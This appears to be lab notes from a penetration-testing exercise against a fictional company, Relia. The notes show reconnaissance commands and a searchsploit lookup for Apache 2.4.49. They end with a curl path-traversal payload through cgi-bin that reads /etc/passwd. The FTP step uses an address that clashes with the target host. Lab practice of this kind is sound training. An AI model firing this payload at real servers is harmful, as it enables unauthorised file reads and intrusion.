# Questions
We are tasked with a penetration test of Relia, an industrial company building driving systems for the timber industry. The target got attacked a few weeks ago and wants now to get an assessment of their IT security. Their goal is to determine if an attacker can breach the perimeter and get access to the domain controller in the internal network.

# Scan the DMZ network
sudo nmap -sC -sV -T4 192.168.243.245-250 192.168.243.189,191
[port-scanning.md]

# Found some interesting port from .245 where it have 2222 running and 21
ssh root@192.168.243.245 -p 2222  
root@192.168.243.245: Permission denied (publickey).
# It required public key, lets try to access FTP port with anonymous user
ftp -p 203.0.113.0
# When prompted for a username, you can enter either “ftp” or “anonymous”. Both are same

# Unfortunately anonymous access FTP is not valid
# Lets focus on the web server, based on the port scanning results, we can see the Apache HTTP server is using 2.4.49
searchsploit apache 2.4.49
searchsploit -m 50383.sh  

# Run the exploitation
code targets.txt
bash 50383.sh
# Seem like the script unable to work
# We can try to get the script command and follow to below

curl -v --path-as-is http://192.168.243.245/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
# Here we get some users
[user.txt]

